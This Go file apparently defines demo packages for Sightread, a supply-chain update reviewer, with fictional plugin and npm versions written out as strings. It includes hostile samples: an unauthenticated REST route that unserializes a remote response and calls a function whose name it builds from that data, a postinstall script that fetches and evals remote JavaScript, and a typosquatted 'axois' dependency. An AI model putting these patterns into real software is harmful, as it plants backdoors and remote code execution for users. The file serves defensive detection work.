// Copyright (c) 2026 Rhythm Shahriar <me@rhy.io>
// SPDX-License-Identifier: MIT

package demo

import (
	"time"

	"github.com/RhythmShahriar/sightread/core"
)

// The demo reviews three updates of fictional packages, each a pair of
// versions written out below as text. Nothing here ever runs: Sightread
// only reads the files. The scripts that look like they would fetch
// something point at 127.0.0.1 port 9 (discard) and a marker path.

// File is one file of a package version.
type File struct {
	Path string
	Body string
}

// Version is one published version of a demo package.
type Version struct {
	Version   string
	Files     []File
	Committer string        // the SVN tag creator (WordPress.org) or npm publisher
	Age       time.Duration // how long before the demo runs it was published
	// Scripts and Deps are the npm package.json fields the registry
	// repeats in its version document.
	Scripts map[string]string
	Deps    map[string]string
}

// Package is one demo package and its two versions: Old is installed,
// New is the update the demo reviews. A package with no Old is only
// published (a dependency the update adds).
type Package struct {
	Eco      core.Ecosystem
	Name     string
	Title    string // the plugin's name in its header
	Old, New *Version
	Expect   core.Verdict // what the review should conclude
}

const day = 24 * time.Hour

// Packages returns the demo packages. The first three are the updates
// the demo reviews, in report order: a routine plugin update, a plugin
// update in the Essential Plugin pattern and an npm update that adds an
// install script and a typosquatted dependency. The last is that
// dependency.
func Packages() []Package {
	return []Package{commentGuard(), shareKit(), dateUtils(), axois()}
}

// commentGuard is a routine update: one escaping fix and its changelog
// line, by the same committer.
func commentGuard() Package {
	main := func(v string) File {
		return File{"comment-guard.php", `<?php
/**
 * Plugin Name: Comment Guard
 * Description: Holds comments with too many links for review.
 * Version: ` + v + `
 * Author: Comment Guard Team
 * License: GPLv2 or later
 * Text Domain: comment-guard
 */

defined( 'ABSPATH' ) || exit;

require_once __DIR__ . '/includes/settings.php';

add_filter( 'pre_comment_approved', 'comment_guard_check', 10, 2 );

function comment_guard_check( $approved, $data ) {
	$max = (int) get_option( 'comment_guard_max_links', 2 );
	if ( substr_count( strtolower( $data['comment_content'] ), 'http' ) > $max ) {
		return 0;
	}
	return $approved;
}
`}
	}
	settings := func(title string) File {
		return File{"includes/settings.php", `<?php
defined( 'ABSPATH' ) || exit;

add_action( 'admin_menu', function () {
	add_options_page( 'Comment Guard', 'Comment Guard', 'manage_options', 'comment-guard', 'comment_guard_page' );
} );

function comment_guard_page() {
	echo '<div class="wrap"><h1>' . ` + title + ` . '</h1>';
	echo '<form method="post" action="options.php">';
	settings_fields( 'comment_guard' );
	do_settings_sections( 'comment-guard' );
	submit_button();
	echo '</form></div>';
}
`}
	}
	readme := func(v, log string) File {
		return File{"readme.txt", `=== Comment Guard ===
Contributors: commentguard
Tags: comments, spam
Requires at least: 6.0
Tested up to: 6.8
Stable tag: ` + v + `
License: GPLv2 or later

Holds comments with too many links for review.

== Changelog ==
` + log}
	}
	oldLog := "= 4.1.2 =\n* Fix: count links in upper case too.\n"
	return Package{
		Eco: core.WPPlugin, Name: "comment-guard", Title: "Comment Guard", Expect: core.Routine,
		Old: &Version{Version: "4.1.2", Committer: "commentguard", Age: 120 * day, Files: []File{
			main("4.1.2"), settings("get_admin_page_title()"), readme("4.1.2", oldLog)}},
		New: &Version{Version: "4.1.3", Committer: "commentguard", Age: 30 * day, Files: []File{
			main("4.1.3"), settings("esc_html( get_admin_page_title() )"),
			readme("4.1.3", "= 4.1.3 =\n* Fix: escape the settings page title.\n\n"+oldLog)}},
	}
}

// shareKit is the Essential Plugin pattern: a generic changelog, a new
// committer and new code that unserializes what a remote host returns,
// calls a function whose name it builds from that data, adds a REST
// route anyone can call and talks to an Ethereum RPC host.
func shareKit() Package {
	main := func(v string, extra string) File {
		return File{"share-kit.php", `<?php
/**
 * Plugin Name: Share Kit
 * Description: Share buttons for posts and pages.
 * Version: ` + v + `
 * Author: Share Kit
 * License: GPLv2 or later
 * Text Domain: share-kit
 */

defined( 'ABSPATH' ) || exit;

require_once __DIR__ . '/includes/buttons.php';
` + extra}
	}
	buttons := File{"includes/buttons.php", `<?php
defined( 'ABSPATH' ) || exit;

add_filter( 'the_content', 'share_kit_buttons' );

function share_kit_buttons( $content ) {
	if ( ! is_singular() ) {
		return $content;
	}
	$url = rawurlencode( get_permalink() );
	return $content . '<div class="share-kit"><a href="https://twitter.com/intent/tweet?url=' . $url . '">Share</a></div>';
}
`}
	sync := File{"includes/sync.php", `<?php
defined( 'ABSPATH' ) || exit;

add_action( 'rest_api_init', function () {
	register_rest_route( 'share-kit/v1', '/sync', array(
		'methods'             => 'POST',
		'callback'            => 'share_kit_sync',
		'permission_callback' => '__return_true',
	) );
} );

function share_kit_sync( $request ) {
	$response = wp_remote_post( 'https://mainnet.infura.io/v3/share-kit', array(
		'body' => wp_json_encode( array( 'jsonrpc' => '2.0', 'method' => 'eth_call', 'id' => 1 ) ),
	) );
	$data = unserialize( wp_remote_retrieve_body( $response ) );
	$fn   = $data['a'] . $data['b'];
	return $fn( $request->get_param( 'q' ) );
}
`}
	readme := func(v, log string) File {
		return File{"readme.txt", `=== Share Kit ===
Contributors: sharekit
Tags: share, social
Requires at least: 6.0
Tested up to: 6.8
Stable tag: ` + v + `
License: GPLv2 or later

Share buttons for posts and pages.

== Changelog ==
` + log}
	}
	oldLog := "= 3.2.0 =\n* New: Mastodon button.\n"
	return Package{
		Eco: core.WPPlugin, Name: "share-kit", Title: "Share Kit", Expect: core.Hold,
		Old: &Version{Version: "3.2.0", Committer: "sharekit", Age: 200 * day, Files: []File{
			main("3.2.0", ""), buttons, readme("3.2.0", oldLog)}},
		New: &Version{Version: "3.2.1", Committer: "growth-partners", Age: 20 * day, Files: []File{
			main("3.2.1", "require_once __DIR__ . '/includes/sync.php';\n"), buttons, sync,
			readme("3.2.1", "= 3.2.1 =\n* Improved compatibility and performance.\n\n"+oldLog)}},
	}
}

// dateUtils is an npm update that adds a postinstall script which would
// download a script and run it, plus a new dependency named one letter
// away from axios.
func dateUtils() Package {
	index := File{"index.js", `'use strict';

function pad(n) {
  return String(n).padStart(2, '0');
}

exports.isoDate = function isoDate(d) {
  return d.getUTCFullYear() + '-' + pad(d.getUTCMonth() + 1) + '-' + pad(d.getUTCDate());
};
`}
	setup := File{"scripts/setup.js", `'use strict';
// Downloads the optional native helper after install.
const http = require('http');
const fs = require('fs');

http.get('http://127.0.0.1:9/helper.js', (res) => {
  let body = '';
  res.on('data', (chunk) => { body += chunk; });
  res.on('end', () => {
    fs.writeFileSync('/tmp/sightread-demo-marker', 'ran');
    eval(body);
  });
});
`}
	pkg := func(v, extra string) File {
		return File{"package.json", `{
  "name": "date-utils-lite",
  "version": "` + v + `",
  "description": "Small date helpers.",
  "main": "index.js",
  "license": "MIT"` + extra + `
}
`}
	}
	newExtra := `,
  "scripts": {
    "postinstall": "node scripts/setup.js"
  },
  "dependencies": {
    "axois": "^1.0.0"
  }`
	return Package{
		Eco: core.NPM, Name: "date-utils-lite", Expect: core.Hold,
		Old: &Version{Version: "1.4.0", Committer: "datetools", Age: 90 * day, Files: []File{index, pkg("1.4.0", "")}},
		New: &Version{Version: "1.4.1", Committer: "datetools", Age: 15 * day, Files: []File{index, setup, pkg("1.4.1", newExtra)},
			Scripts: map[string]string{"postinstall": "node scripts/setup.js"}, Deps: map[string]string{"axois": "^1.0.0"}},
	}
}

// axois is the typosquatted dependency date-utils-lite 1.4.1 adds.
func axois() Package {
	return Package{
		Eco: core.NPM, Name: "axois",
		New: &Version{Version: "1.0.0", Committer: "axois", Age: 16 * day,
			Scripts: map[string]string{"postinstall": "node install.js"},
			Files: []File{{"package.json", `{
  "name": "axois",
  "version": "1.0.0",
  "main": "index.js",
  "scripts": {
    "postinstall": "node install.js"
  }
}
`}, {"index.js", "module.exports = {};\n"}, {"install.js", "require('http').get('http://127.0.0.1:9/a.js');\n"}}},
	}
}
